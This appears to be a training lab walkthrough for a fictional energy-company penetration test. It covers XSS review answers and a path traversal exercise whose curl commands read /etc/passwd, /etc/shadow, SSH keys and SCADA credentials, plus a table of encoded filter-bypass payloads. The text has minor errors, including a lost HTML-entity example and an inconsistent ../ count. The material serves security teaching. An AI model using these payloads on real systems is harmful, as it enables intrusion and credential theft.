2. How would the HttpOnly flag on the session cookie have affected this attack?

Reveal Answer

The HttpOnly flag instructs the browser to prevent JavaScript from accessing the cookie through document.cookie. If the session cookie had HttpOnly set, the XSS payload could still execute arbitrary JavaScript in the victim's browser, but it could not read or exfiltrate the session cookie directly. The attacker would need alternative exploitation strategies: performing actions as the victim within the XSS payload itself (sending requests to change settings, add a new admin account, or extract data rendered on the page), or using other browser APIs. Setting HttpOnly on session cookies is a defense-in-depth measure that significantly limits the impact of XSS, though it does not eliminate the vulnerability.

3. What combination of server-side and client-side defenses would prevent stored XSS in a helpdesk application?

Reveal Answer

A layered defense should include: (1) Server-side input sanitization, stripping or escaping HTML tags and JavaScript before storing ticket content in the database. Libraries like DOMPurify (JavaScript) or Bleach (Python) handle this. (2) Output encoding, ensuring all dynamic content is HTML-entity encoded when rendered in the browser, so <script> becomes <script>. (3) Content Security Policy (CSP) headers that restrict which scripts the browser is allowed to execute, blocking inline scripts and scripts from unauthorized sources. (4) HttpOnly and Secure flags on session cookies to limit the damage if XSS occurs despite other defenses. (5) Subresource Integrity (SRI) for any external scripts. No single defense is sufficient; the combination creates multiple barriers an attacker must bypass.

docs.title: Key Takeaways
docs.text:
• Stored XSS persists and self-propagates. A single malicious ticket can steal the session of every user who views it.
  • Cookie theft is the most common XSS exploitation technique. The document.cookie API gives JavaScript access to session tokens unless the HttpOnly flag is set.
  • The HttpOnly flag is a critical defense. Without it, any XSS vulnerability becomes a session hijacking vulnerability.
  • Input sanitization must happen server-side. Client-side validation is easily bypassed. The server must strip or encode dangerous content before storing it.
  • Content Security Policy (CSP) provides defense in depth. A strict CSP can prevent inline script execution even when the application fails to sanitize input.
  • Webhook and logging endpoints can be weaponized. Application features designed for legitimate integrations (notifications, logging, callbacks) become exfiltration channels when combined with XSS.

docs.title: What is Next
docs.text: You have completed the Web Exploitation chapter. Across three exercises, you exploited SQL injection to extract database secrets, cracked a JWT signing secret to forge admin tokens, and used stored XSS to steal an administrator's session. Review your findings in the Chapter Review before continuing to the next phase of the Meridian Energy engagement.

docs.title: What You Learned
docs.text:
Over three exercises, you exploited three distinct web application vulnerability classes against Meridian Energy Group's internal systems. Each attack demonstrated a different failure in secure development practices.

Exercise Attack Type Root Cause Impact MEG2.1 UNION-based SQL Injection String concatenation in SQL queries Full database read access MEG2.2 JWT Authentication Bypass Weak signing secret, role in client-side token Admin impersonation, API credential theft MEG2.3 Stored XSS Missing input sanitization, no HttpOnly cookie flag Session hijacking, admin panel access

The three attacks share a common thread: each application trusted user-controlled input without proper validation or sanitization. The SQL injection trusted search input as safe SQL. The JWT system trusted client-side role claims signed with a guessable secret. The helpdesk trusted ticket content as safe HTML.

docs.title: Connect the Dots: Engagement Summary
docs.text:
The Meridian Energy Group engagement progressed through two chapters:

Chapter 1 (Reconnaissance) established the attack surface. You discovered three DMZ servers, extracted employee names and email addresses, identified a default credential pattern, and found configuration backups containing database credentials on an anonymous FTP share.

Chapter 2 (Web Exploitation) leveraged those findings to compromise three web applications. SQL injection against the employee portal gave you direct database access. JWT token forgery against the HR portal granted admin privileges and revealed internal API credentials. Stored XSS against the helpdesk stole the IT administrator's session.

Each exercise built on intelligence from the previous phases. Employee names enabled credential guessing. Default password patterns granted initial access. Application access revealed injection points. The progression mirrors how real penetration tests unfold: reconnaissance feeds exploitation, and each compromise opens doors to the next target.

docs.title: Self-Assessment Answer Key
docs.text:
1. The SQL UNION operator requires both SELECT statements to return the same number of columns. If the column counts do not match, the database returns an error and the injection fails. Determining the exact count (via ORDER BY or NULL padding) is a prerequisite for any UNION-based extraction.

2. The information_schema.tables view lists all tables, and information_schema.columns lists all columns with their data types and table associations. Together, they provide a complete map of the database schema.

3. HS256 is symmetric: the same secret key signs and verifies tokens. RS256 is asymmetric: a private key signs tokens and a separate public key verifies them. With HS256, anyone who knows the secret can forge tokens. With RS256, only the holder of the private key can create valid tokens.

4. Stored XSS persists in the database and executes against every user who views the affected page. The attacker submits the payload once. Reflected XSS requires the attacker to trick each individual victim into clicking a crafted URL.

5. The HttpOnly flag prevents JavaScript from accessing the cookie through document.cookie. Session cookies should always have this flag set.

6. A Content Security Policy is an HTTP response header that tells the browser which sources of content (scripts, styles, images) are allowed. A strict CSP can block inline script execution (script-src 'self'), preventing XSS payloads from running even when they are successfully injected into the page.

7. Parameterized queries (prepared statements) eliminate the injection by separating SQL code from user data. Input validation with allowlisting acceptable characters provides an additional layer. Web Application Firewalls (WAFs) can detect and block common injection patterns. Any two of these are acceptable.

8. JWT claims are client-visible and can be forged if the signing secret is compromised. Server-side authorization should verify the user's role from the database on each request rather than trusting the role claim in the token. Token-based authorization is convenient but must be backed by server-side enforcement.

docs.title: The Engagement So Far
docs.text:
Chapters 1 and 2 established your foothold in the Meridian Energy Group network. You mapped the corporate infrastructure through network reconnaissance, discovered exposed services, and exploited web application vulnerabilities on the employee portal and HR system. Those initial footholds provided credentials, session tokens, and a clear picture of the internal network topology.

Now the engagement enters its third phase: infrastructure attacks. The targets shift from public-facing web applications to internal services that support day-to-day operations. A corporate file server stores documents for every department. A SCADA monitoring API tracks real-time data from industrial control systems. Both services were designed for internal use only, and neither was built to withstand a determined attacker who already has valid credentials and network access.

docs.title: Why Infrastructure Matters
docs.text:
Energy companies operate two parallel networks: the corporate IT network (email, file shares, HR systems) and the operational technology (OT) network (SCADA controllers, PLCs, sensor arrays). In theory, these networks are air-gapped. In practice, monitoring dashboards, file shares, and APIs often bridge the gap. A path traversal vulnerability on a file server can expose SCADA credentials stored in a configuration file. An insecure API on a monitoring dashboard can reach internal backend services through server-side request forgery.

The exercises in this chapter demonstrate how attackers pivot from IT infrastructure to OT-adjacent systems using common vulnerability classes that appear in corporate environments worldwide.

Chapters 1 and 2 focused on the perimeter: network reconnaissance and web application exploitation. Now the engagement moves inward. The Meridian Energy Group corporate intranet hosts a document management system where employees download safety manuals, policy documents, and operational procedures. The file download feature was built quickly and never audited. Your job is to find out what happens when you step outside the intended document root.

Make sure you have:

docs.title: Scenario
docs.text:
During your assessment of the Meridian Energy internal network, you discover a corporate intranet site that hosts a document library. Employees use the site to download safety procedures, evacuation plans, and operational guidelines. The download feature accepts a file path parameter in the URL and returns the requested document.

The development team stored the documents in /data/documents/ on the file server. A separate directory, /data/secrets/, contains SCADA system credentials and configuration files that are not intended to be accessible through the web interface. The download endpoint does not validate or sanitize the file path parameter, allowing an attacker to traverse outside the document root using ../ sequences.

Your objective: exploit the path traversal vulnerability to escape the document directory, read system files to confirm the vulnerability, and then locate and extract the SCADA credentials file.

docs.title: Background: Path Traversal Attacks
docs.text: Path traversal (also called directory traversal or dot-dot-slash attacks) occurs when an application uses user-supplied input to construct file paths without proper validation. The attacker manipulates the path by inserting ../ sequences to navigate up the directory tree and access files outside the intended directory.

docs.title: How Path Traversal Works
docs.text:
Consider a web application that serves documents from /data/documents/. A normal download request looks like:

GET /download?file=safety/fire-evacuation-plan.txt

The server constructs the full path by prepending the document root:

/data/documents/ + safety/fire-evacuation-plan.txt = /data/documents/safety/fire-evacuation-plan.txt

An attacker modifies the file parameter to include directory traversal sequences:

GET /download?file=../../../etc/passwd

The server constructs:

/data/documents/ + ../../../etc/passwd = /etc/passwd

Each ../ moves one directory up. Three ../ sequences from /data/documents/ reach the filesystem root, and /etc/passwd resolves to the system password file.

docs.title: URL Encoding of Traversal Sequences
docs.text:
Web Application Firewalls (WAFs) and input filters sometimes block literal ../ strings. Attackers bypass these filters using URL-encoded equivalents:

Encoding Decoded Value Use Case %2e%2e%2f ../ Standard URL encoding %2e%2e/ ../ Partial encoding ..%2f ../ Partial encoding %252e%252e%252f ../ (double-encoded) Bypasses single-decode filters ..%c0%af ../ (overlong UTF-8) Bypasses Unicode-unaware filters ....// Resolves to ../ Bypasses filters that strip single ../

docs.title: Defense Strategies
docs.text:
Proper defenses against path traversal include:

  1. Allowlisting: Maintain a list of permitted files and reject any request for a file not on the list
  2. Canonicalization: Resolve the full path using os.path.realpath() or equivalent, then verify it starts with the expected document root
  3. Chroot jails: Restrict the web application process to a specific directory subtree so traversal beyond the root is impossible at the OS level
  4. Input rejection: Strip or reject any input containing ., /, \, or null bytes, though allowlisting is more reliable

curl -s http://intranet.meridian-energy.corp/

The response should show a login page. The intranet requires authentication before granting access to any internal resources. Look for the login form fields and the form action URL in the HTML source.

docs.title: Step 4: Authenticate to the Intranet

Use Lisa Thornton's Systems Administrator credentials to log in. The login endpoint accepts POST requests with email and password parameters.

Kali - Authenticate as Lisa Thornton

curl -s -c cookies.txt -X POST http://intranet.meridian-energy.corp/login \
  -d "email=l.thornton@meridian-energy.corp&password=Lisa2024#"

The -c cookies.txt flag saves the session cookie to a file. Examine the response for a redirect or welcome message. A successful login should redirect you to the dashboard or return a session token.

Check what the dashboard shows:

Kali - Access the intranet dashboard with session cookie

curl -s -b cookies.txt http://intranet.meridian-energy.corp/dashboard

Look for navigation links, department listings, and any references to a document library or file download feature. The dashboard should present several sections, including a link to the company document repository.

docs.title: Step 5: Browse the Document Library
docs.text:
Navigate to the document library section. The intranet organizes documents by category.

Kali - Access the document library

curl -s -b cookies.txt http://intranet.meridian-energy.corp/documents

The response should list document categories such as Safety, Operations, HR, and Engineering. Each document has a download link. Examine the HTML source carefully to identify the URL pattern used for downloads.

Look for anchor tags or JavaScript calls that reference a download endpoint. The pattern should resemble:

/download?file=safety/fire-evacuation-plan.txt
/download?file=operations/shift-schedule-template.xlsx
/download?file=hr/employee-handbook-2024.pdf

The file parameter specifies a relative path within the document root. The server prepends /data/documents/ to construct the full filesystem path.

docs.title: Step 6: Download a Legitimate Document
docs.text:
Confirm the download feature works with a valid document path:

Kali - Download a legitimate document

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=safety/fire-evacuation-plan.txt"

The response should contain the text of the fire evacuation plan. Note the content type and format. The server reads the file from disk and returns its contents directly in the HTTP response body, with no additional encoding or transformation.

docs.title: Step 7: Test for Path Traversal
docs.text:
Now test whether the download endpoint validates the file path. Start with a basic traversal attempt to read /etc/passwd:

Kali - Test path traversal with /etc/passwd

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../../etc/passwd"

If the response contains lines in the format username:x:uid:gid:comment:home:shell, path traversal is confirmed. The application is constructing the path as:

/data/documents/ + ../../../etc/passwd = /etc/passwd

The three ../ sequences traverse up from /data/documents/ through /data/ and / to the filesystem root, then descend into /etc/passwd.

Examine the passwd file output. Look for:

  • System accounts: root, www-data, postgres, and other service accounts reveal what software is installed
  • User accounts: Any human user accounts may have home directories with additional files to target
  • Shell assignments: Accounts with /bin/bash or /bin/sh can be logged into; accounts with /usr/sbin/nologin cannot

docs.title: Step 8: Determine the Directory Structure
docs.text:
Before targeting the secrets directory, confirm the document root path and explore the server's file structure:

Kali - Read the current process environment to find paths

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../../proc/self/cmdline" | tr '\0' ' '

The /proc/self/cmdline file reveals the command that started the web application process, which often includes the working directory or configuration file path. The tr '\0' ' ' converts null-byte separators to spaces for readability.

Try reading the application's own configuration or source files to understand the directory layout:

Kali - Explore the /data directory listing

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../etc/hostname"

Adjusting the number of ../ sequences helps you understand exactly how deep the document root sits in the filesystem. Two ../ from /data/documents/ reaches /, and then you descend into /etc/hostname.

docs.title: Step 9: Traverse to the Secrets Directory
docs.text:
The document root is /data/documents/. The secrets directory sits at /data/secrets/, which is a sibling directory. To reach it, you only need to traverse up one level from the document root and then into secrets/:

Kali - List the contents of the secrets directory

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../secrets/"

If the server returns a directory listing or error message, you may need to guess filenames. Based on the engagement context (SCADA credentials), try common names:

Kali - Attempt to read SCADA credentials file

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../secrets/scada-credentials.txt"

The response should contain SCADA system credentials, including usernames, passwords, and connection strings for industrial control systems. Among the credentials, look for a flag value in OCR{...} format.

docs.title: Step 10: Try URL-Encoded Traversal
docs.text:
If the direct ../ attempt is blocked by a filter, try URL-encoded variants:

Kali - Test URL-encoded path traversal

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=%2e%2e/secrets/scada-credentials.txt"

And double-encoded:

Kali - Test double-encoded path traversal

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=%252e%252e/secrets/scada-credentials.txt"

Compare the responses. Some filters decode the input once and check for ../, so double encoding (%252e decodes to %2e on first pass, then to . on second pass) can bypass single-decode filters.

docs.title: Step 11: Extract Additional Sensitive Files
docs.text:
With path traversal confirmed, explore what else is accessible. In a real engagement, you would extract as much data as possible to support further attack phases.

Kali - Read the web application configuration

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../../etc/shadow"

The /etc/shadow file contains password hashes. If the web application runs as root (a serious misconfiguration), you will see the hashes. If it runs as a non-root user, you will get a permission denied error, which tells you something about the application's privilege level.

Kali - Check for SSH keys

curl -s -b cookies.txt "http://intranet.meridian-energy.corp/download?file=../../../root/.ssh/authorized_keys"

Authorized keys files reveal which SSH public keys grant access to the system. Private keys (if readable) provide direct authentication without passwords.

docs.title: Step 12: Document and Submit
docs.text: Record the SCADA credentials you extracted and submit the flag on the platform.
